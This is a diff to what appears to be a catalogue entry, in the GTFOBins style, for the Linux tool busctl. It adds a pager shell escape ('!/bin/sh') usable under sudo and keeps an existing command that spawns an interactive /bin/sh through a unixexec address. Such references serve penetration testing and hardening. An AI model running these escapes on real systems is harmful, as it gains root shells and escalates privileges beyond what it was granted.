@@ -10,6 +10,13 @@ functions:
     from: less
   shell:
   - code: |-
+      busctl --show-machine
+      !/bin/sh
+    comment: |-
+      If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+    contexts:
+      sudo:
+  - code: |-
       busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
     contexts:
       sudo:
